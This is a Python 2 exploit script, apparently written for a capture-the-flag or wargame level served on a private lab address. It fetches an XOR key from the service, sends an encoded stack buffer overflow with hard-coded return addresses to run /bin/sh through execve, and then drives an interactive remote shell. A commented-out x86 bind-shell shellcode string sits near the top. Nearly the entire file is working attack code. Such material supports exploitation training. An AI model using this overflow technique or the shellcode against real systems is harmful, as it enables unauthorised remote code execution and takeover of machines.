import socket
import binascii
import struct
import thread

#shellcode = "\x31\xc0\x31\xdb\x50\xb3\x01\x53\x6a\x02\x89\xe1\xb0\x66\xcd\x80\x89\xc7\x31\xf6\x56\x66\x68\x05\x39\x66\x6a\x02\x89\xe1\x6a\x10\x51\x57\x89\xe1\xb3\x02\xb0\x66\xcd\x80\x6a\x01\x57\x89\xe1\xb3\x04\xb0\x66\xcd\x80\x31\xc0\x50\x50\x57\x89\xe1\xb3\x05\xb0\x66\xcd\x80\x89\xc7\x89\xfb\x31\xc9\xb0\x3f\xcd\x80\x41\x83\xf9\x03\x75\xf6\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x31\xd2\x31\xf6\x89\xe1\xb0\x0b\xcd\x80"

def recv_thread(s):
  while True:
    print s.recv(1024),
    

def recv_banner(s):
  response = s.recv(255)
  response += s.recv(1)
  print "Banner: ", response
  return

def recv_encoded(s):

  # receive length of encryption
  response = s.recv(4)
  size = struct.unpack("<I", response)[0]

  print "Response Size: ", size

  loops = size/4096
  if size % 4096 != 0:
     loops+=1

  for x in xrange(loops):
     response = s.recv(4096)

  return 

def build_header(payload):
  length = struct.pack("<I", len(payload))
  return b'\x45' + length

def get_key(s):

  recv_banner(s)

  size = 128
  key_request = b'\x00'*size
  key_request = build_header(key_request) + key_request
  
  #print binascii.hexlify(key_request) +"\n"
  s.send(key_request)

  recv_banner(s)

  # receive key length
  response = s.recv(4)
  print "key length:", struct.unpack("<I", response)[0]

  #receive key
  key = s.recv(size)

  print "key: %s\n" % (binascii.hexlify(key))

  return key


def encode(buff, key):
   encoded = b''
   for i in xrange(len(buff)):
      encoded += struct.pack("B", ord(buff[i]) ^ ord(key[i%128]))

   #print "Encoded Buffer: %s\n" % (encoded)
   return encoded


def send_exploit(s, payload,key):

   exploit = build_header(payload)
   exploit += encode(payload, key)
  
   print "Payload Length: ", len(payload)
   print "Exploit Length: ", len(exploit)
   print "Payload: %s ... %s" % (binascii.hexlify(exploit[:32]), binascii.hexlify(exploit[-32::])) 

   s.send(exploit)

   recv_banner(s)

   #recv_encoded(s)

   return

def stage2_exploit(s, key):
 
   print "Setting up stack for execve"

   '''
   0804b48C:  0804b494    // argv[0]
   0804b490:  00000000    // argv[1]
   0804b494:  '/bin"   
   0804b498:  '/sh\x00'
   '''

   null = '\x00\x00\x00\x00'

   arg0  = b'AAAA'
   #arg0  = b'\x94\xb4\x04\x08'
   arg1  = b'BBBB'
   #arg1  = null
   shell = 'CCCC'
   #shell = b'/bin/sh\x00'

   payload = arg0 + arg1 + shell  

   send_exploit(s, payload, key)

   return payload


def stage1_exploit(s, key):
   
   print "Gaining control over ebp/eip"

   size = 32*4096 + 12
  
   #.bss target is to get 0804b420
   ebp = b'\x1d\xb5\x06\x08'
   eip1 = b'\x00\x98\x04\x08'
   eip2 = b'\xb0\x89\x04\x08'
   execve = b'\xb0\x89\x04\x08'

   '''
    ebp
    eip
    ptr /bin/sh
    argv
    env
   '''
   ret = b'0000'   
   exe  = b'\x10\xb5\x04\x08'
   argv = b'\x14\xb5\x04\x08'
   env  = b'\x00\x00\x00\x00'
 
   payload = b'\x90'*size + ebp + eip1 + eip2 + execve + ret + exe + argv + env

   send_exploit(s, payload, key)

   return 


def pwn_lvl(s):

   key = get_key(s)
   stage1_exploit(s, key)
   stage2_exploit(s, key)

   s.send("Q")

   thread.start_new_thread(recv_thread, (s,))

   print "#/bin/sh: "
   while True:
      cmd = raw_input() + "\n"
      s.send(cmd)

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('192.168.56.101', 20002))

pwn_lvl(s)

print "Quitting"
